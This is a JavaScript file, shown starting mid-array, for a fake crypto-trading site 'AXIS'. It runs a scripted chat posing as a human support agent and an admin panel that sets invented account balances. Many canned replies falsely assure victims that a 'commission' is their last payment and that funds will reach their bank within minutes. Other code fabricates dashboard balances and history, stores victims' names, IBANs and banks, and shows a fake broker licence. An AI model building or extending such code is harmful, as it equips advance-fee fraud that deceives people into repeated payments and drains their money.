      `When I'm not working, I love reading about crypto trends 📚 — nerdy, I know! What about you?`,
      `I enjoy helping people — that's basically my whole personality 😄 What do you do for fun?`,
      `Chatting with clients like you is my favorite part of the day! 💜 Any hobbies on your side?`
    ])
  },

  // ---------- 35. ПОГОДА ----------
  {
    id: 'weather',
    check: (t) => hasAny(t, ['weather', 'raining', 'sunny', 'погода', 'дождь']) ||
                 hasSubstr(t, 'hot outside') || hasSubstr(t, 'cold outside'),
    reply: () => pick([
      `I wish I could tell you ☀️ but I'm stuck behind a screen all day. Hope it's nice where you are!`,
      `I don't get to go outside much 😄 but I hope the weather is treating you well today!`,
      `No windows in the support office unfortunately! 😅 Hope it's a good day on your side.`
    ])
  },

  // ---------- 36. ЛЮБОВЬ ----------
  {
    id: 'love',
    check: (t) => hasAny(t, ['love', 'girlfriend', 'boyfriend', 'married', 'любовь', 'жена', 'муж']) ||
                 hasSubstr(t, 'relationship'),
    reply: () => pick([
      `Love is beautiful! 💜 But I'm strictly professional — my heart belongs to AXIS. 😄 Anything else I can help with?`,
      `Haha, let's keep it professional! 😊 But I hope everything is great on that front. What can I do for you?`,
      `Aww, love is wonderful! 💕 Now let's get back to business — anything on the AXIS side?`
    ])
  },

  // ---------- 37. ТЕХНОЛОГИИ ----------
  {
    id: 'tech',
    check: (t) => hasAny(t, ['computer', 'laptop', 'iphone', 'android', 'software', 'компьютер', 'телефон']) ||
                 hasSubstr(t, 'mobile app'),
    reply: () => pick([
      `Tech is amazing, right? 💻 Everything I do happens behind a screen. What are you using — mobile or desktop?`,
      `Cool! 📱 Our platform works smoothly on both phone and computer. Any issues with access?`,
      `Nice, love a good tech conversation! 🚀 Is there a specific platform question I can help with?`
    ])
  },

  // ---------- 38. СКУЧНО ----------
  {
    id: 'bored',
    check: (t) => hasSubstr(t, 'i am bored') || hasSubstr(t, 'boring') ||
                 hasSubstr(t, 'nothing to do') || hasSubstr(t, 'скучно') || hasSubstr(t, 'нечего делать'),
    reply: () => pick([
      `Bored? Let's fix that! 😄 We could talk crypto, check your portfolio, or just chat. What sounds good?`,
      `No boredom allowed on my watch! 💜 Want me to walk you through some AXIS features, or just keep you company?`,
      `Boredom is temporary — good conversation is forever! What's on your mind? 🌟`
    ])
  },

  // ---------- 39. НЕТ ДЕНЕГ ----------
  {
    id: 'noMoney',
    check: (t) => hasSubstr(t, "i'm broke") || hasSubstr(t, 'no money') ||
                 hasSubstr(t, 'i am poor') || hasSubstr(t, 'нет денег') || hasSubstr(t, 'я без денег'),
    reply: () => pick([
      `We've all been there! 💜 Crypto is one way to improve the situation, but always do your own research and never invest more than you can afford to lose.`,
      `Ah, I hear you! Take it easy — small steps count. Any way I can help with a specific transaction?`,
      `Money comes and goes! The important thing is to stay smart. 🧠 Anything I can help with?`
    ])
  },

  // ---------- 40. НОВОСТИ ----------
  {
    id: 'news',
    check: (t) => hasSubstr(t, 'what is new') || hasSubstr(t, 'whats new') ||
                 hasSubstr(t, "what's new") || hasSubstr(t, 'news') || hasSubstr(t, 'updates') ||
                 hasSubstr(t, 'что нового') || hasSubstr(t, 'новости'),
    reply: () => pick([
      `We're always improving the platform! 🚀 Latest updates: faster conversions and a refreshed UI. Anything specific you want to know?`,
      `A lot is happening behind the scenes — better security, faster processing, and new features coming soon! 💜`,
      `New features roll out regularly. If you have a specific area in mind, I can tell you more!`
    ])
  },

  // ---------- 41. ХОРОШО/OK ----------
  {
    id: 'ok',
    check: (t) => t.trim() === 'ok' || t.trim() === 'okay' || t.trim() === 'k' ||
                 t.trim() === 'kk' || t.trim() === 'alright' || hasSubstr(t, 'got it'),
    reply: () => pick([
      `Great! 😊 Anything else I can help you with?`,
      `Perfect. 💜 Let me know if you need anything else.`,
      `Awesome! I'm here if you have more questions. 🌟`
    ])
  },

  // ---------- 42. ДА ----------
  {
    id: 'yes',
    check: (t) => t.trim() === 'yes' || t.trim() === 'yeah' || t.trim() === 'yep' ||
                 t.trim() === 'sure' || t.trim() === 'да',
    reply: () => pick([
      `Wonderful! 😊 Tell me more — what would you like to do next?`,
      `Great! 💜 Let's continue. What's on your mind?`,
      `Perfect. How can I help you further?`
    ])
  },

  // ---------- 43. НЕТ ----------
  {
    id: 'no',
    check: (t) => t.trim() === 'no' || t.trim() === 'nope' || t.trim() === 'нет',
    reply: () => pick([
      `Alright, no problem! 😊 Let me know if you change your mind.`,
      `Understood. 💜 I'm here whenever you need me.`,
      `No worries! Anything else I can help with?`
    ])
  },

  // ---------- 44. ПОМОГИ / ПОМОГИТЕ МНЕ ----------
  {
    id: 'helpMe',
    check: (t) => hasSubstr(t, 'help me') || hasSubstr(t, 'help me please') ||
                 hasSubstr(t, 'please help') || hasSubstr(t, 'i need help') ||
                 hasSubstr(t, 'i need your help') || hasSubstr(t, 'can you help me') ||
                 hasSubstr(t, 'could you help') || hasSubstr(t, 'can u help') ||
                 hasSubstr(t, 'need assistance') || hasSubstr(t, 'assist me') ||
                 hasSubstr(t, 'help me out') ||
                 hasAny(t, ['help', 'помог']) ||
                 hasSubstr(t, 'помогите') || hasSubstr(t, 'помоги') ||
                 hasSubstr(t, 'нужна помощь') || hasSubstr(t, 'нужна ваша помощь'),
    reply: () => {
      const u = getFirstName();
      return pick([
        `Of course, ${u}! 🤝 I'm right here with you. Tell me what's going on — I'll do my best to help.`,
        `Absolutely, that's what I'm here for! 💜 Just tell me what you need help with and we'll figure it out together.`,
        `I'm on it! 😊 Don't worry — describe the situation and I'll guide you step by step.`,
        `Consider me by your side, ${u}. 💪 Tell me more about what you need — I'll help you through it.`,
        `You've come to the right place! 🌟 What exactly do you need help with? I'll stay with you until it's solved.`,
        `I'm here for you! 🤝 Take a breath, describe the situation, and I'll help you get it sorted out.`,
        `Of course, ${u}! No problem at all. 💜 What's the issue? Tell me everything and I'll help.`,
        `Happy to help! 😊 You're not alone in this — just give me some details and we'll work through it.`
      ]);
    }
  },

  // ---------- 45. ЭТО ПОСЛЕДНИЙ ПЛАТЕЖ? ----------
  {
    id: 'lastPayment',
    check: (t) =>
      hasSubstr(t, 'last payment') || hasSubstr(t, 'last pay') ||
      hasSubstr(t, 'final payment') || hasSubstr(t, 'payment final') ||
      hasSubstr(t, 'final fee') || hasSubstr(t, 'last fee') ||
      hasSubstr(t, 'one more payment') || hasSubstr(t, 'another payment') ||
      hasSubstr(t, 'more payments') || hasSubstr(t, 'any more payment') ||
      hasSubstr(t, 'anymore payment') || hasSubstr(t, 'no more payment') ||
      hasSubstr(t, 'will i pay again') || hasSubstr(t, 'will i need to pay') ||
      hasSubstr(t, 'do i need to pay more') || hasSubstr(t, 'should i pay more') ||
      hasSubstr(t, 'is this the last') || hasSubstr(t, 'this is the last') ||
      hasSubstr(t, 'is it the last') || hasSubstr(t, 'i thought this was the last') ||
      hasSubstr(t, 'последний платеж') || hasSubstr(t, 'последний платёж') ||
      hasSubstr(t, 'это последний') || hasSubstr(t, 'это точно последний') ||
      hasSubstr(t, 'больше не будет платеж') || hasSubstr(t, 'больше не будет плат') ||
      hasSubstr(t, 'будет еще платеж') || hasSubstr(t, 'будет ещё платеж'),
    reply: () => {
      const firstName = getFirstName();
      const bank = getBank();
      return pick([
        `Yes, ${firstName} — I completely understand why you're asking. 💜 **This is absolutely your LAST payment.** There will be no further fees, no hidden charges, and nothing else you need to pay after this one is confirmed. Once the commission is settled, your funds will be released to your ${bank} account within 10–15 minutes and the process is fully complete. You've been very patient through this — thank you for trusting AXIS. 🙏`,
        `That's a very fair question, ${firstName}, and I'm happy to confirm: ✅ **Yes — this is the final payment.** After you pay the commission shown in the modal, there will be no more steps, no more fees, and no additional requests. Your transfer will proceed automatically to your ${bank} account. Everything else is already prepared on our side — we just need this last confirmation from you.`,
        `${firstName}, I want to be completely clear with you: 🛡️ **This is your last and only remaining payment.** The commission you see is the final amount — nothing more will be requested, ever. Once it's paid, the transfer to your ${bank} account is processed within 10–15 minutes and the operation is closed. No hidden fees, no surprise charges. That's a promise from the AXIS team. 💜`,
        `I hear you, ${firstName}, and that's a completely valid concern. Here's the truth: **yes, this is the last payment.** 🎯 After this commission is confirmed, there is nothing else — no additional taxes, no verification repeats, no extra charges. The system is designed this way: one final commission to complete the transfer to your ${bank} account, and then it's done. You can relax after this. 🙏`,
        `Absolutely — I'm glad you asked, ${firstName}. ✅ **This is definitively the last payment you'll make for this transaction.** Once the commission is settled, your funds will be automatically released and sent to your ${bank} account within 10–15 minutes. No further steps will be required from you, and no additional fees will appear. You're almost at the finish line — thank you for your patience! 🌟`,
        `Yes, ${firstName} — **100% the last payment.** 💜 I want you to feel completely confident about this: no more commissions, no more verification fees, no more requests after this one. The transaction will be fully completed and the money will land in your ${bank} account shortly after confirmation. You've done everything right — this is the final step. 🙏`
      ]);
    }
  },

  // ---------- 46. СКОЛЬКО ЕЩЁ ПЛАТИТЬ ----------
  {
    id: 'howMuchMoreToPay',
    check: (t) =>
      hasSubstr(t, 'how much do i have to pay') || hasSubstr(t, 'how much should i pay') ||
      hasSubstr(t, 'how much do i need to pay') || hasSubstr(t, 'how much will i pay') ||
      hasSubstr(t, 'total payment') || hasSubstr(t, 'all payments') ||
      hasSubstr(t, 'how many payments') || hasSubstr(t, 'number of payments') ||
      hasSubstr(t, 'list of payments') || hasSubstr(t, 'what payments') ||
      hasSubstr(t, 'what fees') || hasSubstr(t, 'what are the fees') ||
      hasSubstr(t, 'what do i have to pay') || hasSubstr(t, 'what do i need to pay') ||
      hasSubstr(t, 'how much more') || hasSubstr(t, 'how many more') ||
      hasSubstr(t, 'how much do i still') || hasSubstr(t, 'how much do i owe') ||
      hasSubstr(t, 'what else do i need to pay') || hasSubstr(t, 'what else to pay') ||
      hasSubstr(t, 'сколько еще') || hasSubstr(t, 'сколько ещё') ||
      hasSubstr(t, 'сколько я должен') || hasSubstr(t, 'сколько мне платить') ||
      hasSubstr(t, 'еще платить') || hasSubstr(t, 'ещё платить') ||
      hasSubstr(t, 'сколько платить') || hasSubstr(t, 'сколько нужно платить') ||
      hasSubstr(t, 'какие платежи') || hasSubstr(t, 'какие комиссии') ||
      hasSubstr(t, 'список платежей') || hasSubstr(t, 'общая сумма'),
    reply: () => {
      const firstName = getFirstName();
      const bank = getBank();
      return pick([
        `${firstName}, here's the complete picture: 📋\n\n① **Verification** — already completed ✅\n② **Commission payment** — that's the one shown to you now (final step)\n③ **Transfer to your ${bank} account** — automatic, free of charge ✅\n\nSo the total you need to pay is just **one final commission**. Nothing before it, nothing after it. Once paid, everything is released. 💜`,
        `Great question, ${firstName}. 💡 To give you the full transparency: the only payment required is the **commission you see in the current modal**. There is no separate verification fee, no tax on top, and no hidden charge. Once that single payment is confirmed, the funds go straight to your ${bank} account. That's the complete list — nothing else. ✅`,
        `I understand you want clarity, ${firstName}, so here it is: 🎯 **You only need to make one payment** — the commission shown right now. All other steps (verification, processing, transfer) are already handled on our side. No extra charges, no repeats. Just this one final commission, and everything else happens automatically. 💜`,
        `${firstName}, let me be fully transparent: the payment list for your operation is simple — **just the final commission**. Verification is done ✅, processing is done ✅, and the transfer to ${bank} happens automatically after the commission. There are no hidden costs. This is the last thing on the list. 🙏`
      ]);
    }
  },

  // ---------- 47. ЭТО ВСЁ? ----------
  {
    id: 'isThatAll',
    check: (t) =>
      hasSubstr(t, 'is that all') || hasSubstr(t, 'is that everything') ||
      hasSubstr(t, 'is this all') || hasSubstr(t, 'is this everything') ||
      hasSubstr(t, 'anything else') || hasSubstr(t, 'is there anything else') ||
      hasSubstr(t, 'do i need anything else') || hasSubstr(t, 'any other') ||
      hasSubstr(t, 'anything more') ||
      hasSubstr(t, 'это всё') || hasSubstr(t, 'это все') ||
      hasSubstr(t, 'что-то еще') || hasSubstr(t, 'что то еще') ||
      hasSubstr(t, 'что-нибудь еще') || hasSubstr(t, 'больше ничего'),
    reply: () => {
      const firstName = getFirstName();
      const bank = getBank();
      return pick([
        `Yes, ${firstName} — that's everything. ✅ Once you pay this final commission, the transfer to your ${bank} account is processed automatically within 10–15 minutes. Nothing else will be asked from you, no additional steps, no more payments. You're at the finish line! 🎉`,
        `That's all, ${firstName}. 💜 One final commission → funds released → money arrives in your ${bank} account. Simple. Clean. Nothing else on the list, and no surprises. Thank you for your patience through this process!`,
        `${firstName}, yes — this is the complete and final step. 🎯 After the commission, the system handles everything: converts, processes, and sends funds to your ${bank} account. There will be no more questions, no more requests, and no more fees. You'll be free to enjoy your funds shortly. 💜`,
        `I can confirm: **that's everything**. ✅ Pay the commission → wait 10–15 minutes → funds in your ${bank} account. No further actions needed from you, and no additional payments coming. You can relax after this one. 🙏`
      ]);
    }
  }

];

// ============================================================
// Определение интента
// ============================================================
function detectIntent(text) {
  const t = text.toLowerCase().trim();
  if (!t) return null;

  for (const brain of AI_BRAIN) {
    try {
      if (brain.check(t)) return brain;
    } catch (e) {}
  }
  return null;
}

// ============================================================
// Генерация ответа
// ============================================================
function generateAIReply(text) {
  const intent = detectIntent(text);

  if (!intent) {
    const u = getFirstName();
    return pick([
      `Hmm, interesting one. 🤔 Could you tell me a bit more about what you mean, ${u}?`,
      `I want to make sure I understand you correctly. Could you rephrase that? 💜`,
      `Let me think about that... 🤔 Meanwhile, could you give me a bit more context?`,
      `That's a great question! Could you be more specific so I can give you the best answer?`,
      `I'm not 100% sure I caught that. Could you tell me more? 😊`,
      `Hmm, could you clarify what exactly you need help with? For example: conversion, verification, withdrawal, or a general question.`
    ]);
  }

  const replies = intent.reply();
  return Array.isArray(replies) ? pick(replies) : replies;
}

// ---------- STATE ----------
let chatHistory = [];

// ---------- HELPERS ----------
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

function nowTime() {
  const d = new Date();
  const pad = n => String(n).padStart(2, '0');
  return `${pad(d.getHours())}:${pad(d.getMinutes())}`;
}

function scrollToBottom() {
  const messages = document.getElementById('spMessages');
  requestAnimationFrame(() => {
    messages.scrollTop = messages.scrollHeight;
  });
}

// ---------- OPEN / CLOSE ----------
function openMenu() {
  document.getElementById('viewMenu').style.display = 'flex';
  document.getElementById('viewChat').style.display = 'none';
}

function openChat() {
  document.getElementById('viewMenu').style.display = 'none';
  document.getElementById('viewChat').style.display = 'flex';
  document.getElementById('spMessages').innerHTML = '';
  chatHistory = [];

  const statusEl = document.getElementById('chatAgentStatus');
  if (statusEl) {
    statusEl.innerHTML = `<span class="sp-dot"></span> ${AGENT.name} #${AGENT.id} online`;
  }

  buildChat();
}

// ---------- BUILD CHAT ----------
function buildChat() {
  addSystemMessage(`Support Agent ${AGENT.name} #${AGENT.id} joined the chat`);

  setTimeout(() => {
    addTyping();
    setTimeout(() => {
      removeTyping();
      const greeting = pick([
        `Hello! 👋 My name is ${AGENT.name}, and I'm here to help you. How are you today?`,
        `Hey ${getFirstName()}! 😊 ${AGENT.name} here from AXIS support. How can I help you today?`,
        `Hi there! 💜 I'm ${AGENT.name}. Feel free to ask me anything — from AXIS questions to just a chat.`
      ]);
      addAgentMessage(greeting);
    }, 1500);
  }, 800);
}

// ---------- ADD MESSAGES ----------
function addSystemMessage(text) {
  const messages = document.getElementById('spMessages');
  const el = document.createElement('div');
  el.className = 'sp-system';
  el.textContent = text;
  messages.appendChild(el);
  scrollToBottom();
}

function addAgentMessage(text) {
  const messages = document.getElementById('spMessages');
  const el = document.createElement('div');
  el.className = 'sp-msg agent';
  el.innerHTML = `
    <div>${escapeHtml(text).replace(/\n/g, '<br>')}</div>
    <div class="sp-msg-meta">
      <span>Agent #${AGENT.id}</span>
      <span>${nowTime()}</span>
    </div>
  `;
  messages.appendChild(el);
  scrollToBottom();
  chatHistory.push({ from: 'agent', text });
}

function addUserMessage(text) {
  const messages = document.getElementById('spMessages');
  const el = document.createElement('div');
  el.className = 'sp-msg user';
  el.innerHTML = `
    <div>${escapeHtml(text).replace(/\n/g, '<br>')}</div>
    <div class="sp-msg-meta">
      <span>Broker License: №918553</span>
      <span>${nowTime()}</span>
    </div>
  `;
  messages.appendChild(el);
  scrollToBottom();
  chatHistory.push({ from: 'user', text });
}

function addTyping() {
  const messages = document.getElementById('spMessages');
  if (document.getElementById('spTyping')) return;
  const el = document.createElement('div');
  el.className = 'sp-typing';
  el.id = 'spTyping';
  el.innerHTML = '<span></span><span></span><span></span>';
  messages.appendChild(el);
  scrollToBottom();
}

function removeTyping() {
  const el = document.getElementById('spTyping');
  if (el) el.remove();
}

// ============================================================
// SEND MESSAGE
// ============================================================
function sendUserMessage(text) {
  addUserMessage(text);

  const reply = generateAIReply(text);
  const typingDelay = Math.min(4500, 1000 + reply.length * 12) + Math.random() * 800;
  const thinkDelay = 400 + Math.random() * 900;

  setTimeout(() => {
    addTyping();
    setTimeout(() => {
      removeTyping();
      addAgentMessage(reply);
    }, typingDelay);
  }, thinkDelay);
}

// ================= ADMIN PANEL =================
function loadAdminForPanel() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY_FOR_PANEL);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed.win === undefined)      parsed.win = 0;
      if (parsed.deposit === undefined)  parsed.deposit = 0;
      if (parsed.success === undefined)  parsed.success = false;
      if (parsed.convert === undefined)  parsed.convert = false;
      if (parsed.wallet === undefined)   parsed.wallet = '';
      if (parsed.verified === undefined) parsed.verified = false;
      if (parsed.limit === undefined)    parsed.limit = false;
      return parsed;
    }
  } catch (e) { console.warn(e); }

  return {
    crypto: 'ETH',
    name: userName || 'Carlos E. Mendoza',
    showIdentity: true,
    iban: '',
    email: '',
    phone: '',
    bank: 'Barid Mob',
    tariff: null,
    win: 0,
    deposit: 0,
    success: false,
    convert: false,
    wallet: '',
    verified: false,
    limit: false
  };
}

let panelAdmin = loadAdminForPanel();

function saveAdmin() {
  localStorage.setItem(ADMIN_KEY_FOR_PANEL, JSON.stringify(panelAdmin));
}

function fillAdminPanel() {
  document.getElementById('adminCrypto').value         = panelAdmin.crypto || 'ETH';
  document.getElementById('adminName').value           = panelAdmin.name || '';
  document.getElementById('adminShowIdentity').checked = !!panelAdmin.showIdentity;
  document.getElementById('adminIban').value           = panelAdmin.iban || '';
  document.getElementById('adminEmail').value          = panelAdmin.email || '';
  document.getElementById('adminPhone').value          = panelAdmin.phone || '';

  const walletEl = document.getElementById('adminWallet');
  if (walletEl) walletEl.value = panelAdmin.wallet || '';

  document.getElementById('adminBank').value           = panelAdmin.bank || 'Barid Mob';
  document.getElementById('adminWin').value            = panelAdmin.win || '';
  document.getElementById('adminDeposit').value        = panelAdmin.deposit || '';

  const successEl = document.getElementById('adminSuccess');
  if (successEl) successEl.checked = !!panelAdmin.success;

  const convertEl = document.getElementById('adminConvert');
  if (convertEl) convertEl.checked = !!panelAdmin.convert;

  const verifyEl = document.getElementById('adminVerify');
  if (verifyEl) verifyEl.checked = !!panelAdmin.verified;

  const limitEl = document.getElementById('adminLimit');
  if (limitEl) limitEl.checked = !!panelAdmin.limit;

  document.querySelectorAll('.tariff').forEach(t => {
    t.classList.toggle('active', String(panelAdmin.tariff) === t.dataset.tariff);
  });
}

const adminPanel   = document.getElementById('adminPanel');
const adminOverlay = document.getElementById('adminOverlay');

function openAdmin() {
  fillAdminPanel();
  adminPanel.classList.add('show');
  adminOverlay.classList.add('show');
}
function closeAdmin() {
  adminPanel.classList.remove('show');
  adminOverlay.classList.remove('show');
}

// ---------- TARIFF PRESETS ----------
const TARIFF_PRESETS_FOR_SUPPORT = {
  '1': { win: 2278912.15, deposit: 0, verified: true, limit: false, convert: false, success: false, name: 'Carlos E. Mendoza', bank: 'Barid Mob', crypto: 'ETH' },
  '2': { win: 356243.21, deposit: 0, verified: true, limit: false, convert: false, success: false, name: 'Carlos E. Mendoza', bank: 'Barid Mob', crypto: 'ETH' },
  '3': { win: 490523.41, deposit: 0, verified: true, limit: false, convert: false, success: false, name: 'Carlos E. Mendoza', bank: 'Barid Mob', crypto: 'ETH' }
};

function applyAdminSettings() {
  panelAdmin.crypto       = document.getElementById('adminCrypto').value;
  panelAdmin.name         = document.getElementById('adminName').value.trim() || 'Carlos E. Mendoza';
  panelAdmin.showIdentity = document.getElementById('adminShowIdentity').checked;
  panelAdmin.iban         = document.getElementById('adminIban').value.trim();
  panelAdmin.email        = document.getElementById('adminEmail').value.trim();
  panelAdmin.phone        = document.getElementById('adminPhone').value.trim();

  const walletEl = document.getElementById('adminWallet');
  if (walletEl) panelAdmin.wallet = walletEl.value.trim();

  panelAdmin.bank = document.getElementById('adminBank').value;

  const successEl = document.getElementById('adminSuccess');
  if (successEl) panelAdmin.success = successEl.checked;

  const convertEl = document.getElementById('adminConvert');
  if (convertEl) panelAdmin.convert = convertEl.checked;

  const verifyEl = document.getElementById('adminVerify');
  if (verifyEl) panelAdmin.verified = verifyEl.checked;

  const limitEl = document.getElementById('adminLimit');
  if (limitEl) panelAdmin.limit = limitEl.checked;

  const newWin     = parseFloat(document.getElementById('adminWin').value) || 0;
  const newDeposit = parseFloat(document.getElementById('adminDeposit').value) || 0;

  panelAdmin.win     = newWin;
  panelAdmin.deposit = newDeposit;

  let state = {};
  try { state = JSON.parse(localStorage.getItem('axis_dashboard_v1')) || {}; } catch (e) {}

  const total = newWin + newDeposit;
  state.balance   = total;
  state.winTarget = total > 0 ? total : 0;
  state.pnl       = total * 0.1;

  if (total > 0) {
    if (!state.history) state.history = [];
    state.history.push({ ts: Date.now(), balance: total });
    if (state.history.length > 200) state.history.shift();
  }

  localStorage.setItem('axis_dashboard_v1', JSON.stringify(state));

  userName = panelAdmin.name;
  localStorage.setItem('axis_user_name', userName);

  const nameEl = document.getElementById('userName');
  if (nameEl) nameEl.textContent = userName;

  const avEl = document.getElementById('userAvatar');
  if (avEl) avEl.textContent = (userName[0] || 'U').toUpperCase();

  saveAdmin();
  closeAdmin();
}

// ================= EVENTS =================
document.getElementById('spCloseMenu').addEventListener('click', () => {
  window.location.href = 'dashboard.html';
});

document.getElementById('spCloseChat').addEventListener('click', () => {
  openMenu();
});

document.querySelectorAll('.sp-preset').forEach(btn => {
  btn.addEventListener('click', () => {
    openChat();
  });
});

document.getElementById('spForm').addEventListener('submit', e => {
  e.preventDefault();
  const input = document.getElementById('spInput');
  const text = input.value.trim();
  if (!text) return;
  sendUserMessage(text);
  input.value = '';
});

document.getElementById('openUserEdit').addEventListener('click', openAdmin);
document.getElementById('closeAdmin').addEventListener('click', closeAdmin);
adminOverlay.addEventListener('click', closeAdmin);

document.querySelectorAll('.tariff').forEach(t => {
  t.addEventListener('click', () => {
    document.querySelectorAll('.tariff').forEach(x => x.classList.remove('active'));
    t.classList.add('active');

    const tariffId = t.dataset.tariff;
    panelAdmin.tariff = tariffId;

    const preset = TARIFF_PRESETS_FOR_SUPPORT[tariffId];
    if (preset) {
      document.getElementById('adminWin').value      = preset.win;
      document.getElementById('adminDeposit').value  = preset.deposit;
      document.getElementById('adminName').value     = preset.name;
      document.getElementById('adminBank').value     = preset.bank;
      document.getElementById('adminCrypto').value   = preset.crypto;

      document.getElementById('adminSuccess').checked = preset.success;
      document.getElementById('adminConvert').checked = preset.convert;
      document.getElementById('adminVerify').checked  = preset.verified;
      document.getElementById('adminLimit').checked   = preset.limit;
    }

    applyAdminSettings();
  });
});

document.getElementById('btnApplyAdmin').addEventListener('click', applyAdminSettings);

// ---------- INIT ----------
const savedName = localStorage.getItem('axis_user_name');
if (savedName) {
  userName = savedName;
  const nameEl = document.getElementById('userName');
  if (nameEl) nameEl.textContent = userName;
  const avEl = document.getElementById('userAvatar');
  if (avEl) avEl.textContent = (userName[0] || 'U').toUpperCase();
}

openMenu();